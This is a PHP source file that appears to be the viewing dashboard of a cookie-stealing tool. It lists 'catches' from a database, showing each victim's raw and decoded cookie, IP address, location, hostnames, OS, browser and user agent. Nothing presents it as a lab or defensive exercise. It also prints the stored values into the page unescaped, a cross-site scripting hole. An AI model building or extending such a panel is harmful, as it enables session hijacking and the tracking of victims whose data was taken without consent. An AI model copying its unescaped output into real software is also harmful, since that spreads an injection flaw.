<?php
    require_once("Core/init.php");

    echo HTMLBuilder::GetDoctypeAndLang();
    echo HTMLBuilder::GetHead(null, "dashboard");

    echo HTMLBuilder::GetHeader();
?>
    <div class="content" id="content">
        <?php
            $Catches = (new Database())::Select("catches", array(["id", "!=", ""]), null, ["order_by" => "catch_date", "order" => "DESC"]);
            
            // id, cookie, decoded_cookie, ip_address, user_agent, local_hostname,
            // hostname, location, client_os, client_browser, catch_date
            if(!empty($Catches) & $Catches !== null) {
                foreach($Catches as $Catch) {
                    echo "
                        <div class=\"catch-row-container\" id=\"catch-row-container\">
                            <p class=\"catch-display-row-data\" id=\"catch-display-row-data-id\">Catch ID: <span class=\"row-data-span\">" . $Catch["id"] . "</span></p>
                            <p class=\"catch-display-row-data\" id=\"catch-display-row-data-date\">Catch Date: <span class=\"row-data-span\">" . $Catch["catch_date"] . "</span></p>
                            <p class=\"catch-display-row-data\" id=\"catch-display-row-data-cookie\">Cookie: <span class=\"row-data-span\">" . $Catch["cookie"] . "</span></p>
                            <p class=\"catch-display-row-data\" id=\"catch-display-row-data-decoded\">Decoded Cookie: <span class=\"row-data-span\">" . $Catch["decoded_cookie"] . "</span></p>
                            <p class=\"catch-display-row-data\" id=\"catch-display-row-data-ip\">IP Address: <span class=\"row-data-span\">" . $Catch["ip_address"] . "</span></p>
                            <p class=\"catch-display-row-data\" id=\"catch-display-row-data-location\">Location: <span class=\"row-data-span\">" . $Catch["location"] . "</span></p>
                            <p class=\"catch-display-row-data\" id=\"catch-display-row-data-local\">Local Hostname: <span class=\"row-data-span\">" . $Catch["local_hostname"] . "</span></p>
                            <p class=\"catch-display-row-data\" id=\"catch-display-row-data-hostname\">Hostname: <span class=\"row-data-span\">" . $Catch["hostname"] . "</span></p>
                            <p class=\"catch-display-row-data\" id=\"catch-display-row-data-os\">Client OS: <span class=\"row-data-span\">" . $Catch["client_os"] . "</span></p>
                            <p class=\"catch-display-row-data\" id=\"catch-display-row-data-browser\">Client Browser: <span class=\"row-data-span\">" . $Catch["client_browser"] . "</span></p>
                            <p class=\"catch-display-row-data\" id=\"catch-display-row-data-useragent\">User Agent: <span class=\"row-data-span\">" . $Catch["user_agent"] . "</span></p>
                        </div>
                    ";
                }
            }
        ?>
    </div>
<?php echo HTMLBuilder::GetFooter(); ?>
